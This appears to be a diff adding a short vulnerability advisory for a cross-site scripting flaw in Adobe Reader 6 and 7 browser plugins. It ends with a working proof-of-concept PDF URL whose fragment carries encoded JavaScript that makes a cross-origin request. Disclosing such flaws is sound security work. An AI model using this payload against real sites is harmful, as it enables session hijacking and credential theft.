@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/21858/info
+
+Adobe Reader Plugin is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input. 
+
+An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the visited site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects Adobe Reader versions 6 and 7 for Mozilla Firefox, Opera, and Microsoft Internet Explorer. Other versions for other browsers may also be affected.
+
+http://www.example.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function%20createXMLHttpRequest(){%20%20%20try{%20return%20new%20ActiveXObject('Msxml2.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20ActiveXObject('Microsoft.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20XMLHttpRequest();%20}catch(e){}%20%20%20return%20null;}var%20xhr%20=%20createXMLHttpRequest();xhr.onreadystatechange%20=%20function(){%20%20%20%20if%20(xhr.readyState%20==%204)%20%20%20%20%20%20%20%20alert(xhr.responseText);};xhr.open('GET',%20'http://www.google.com',%20true);xhr.send(null);
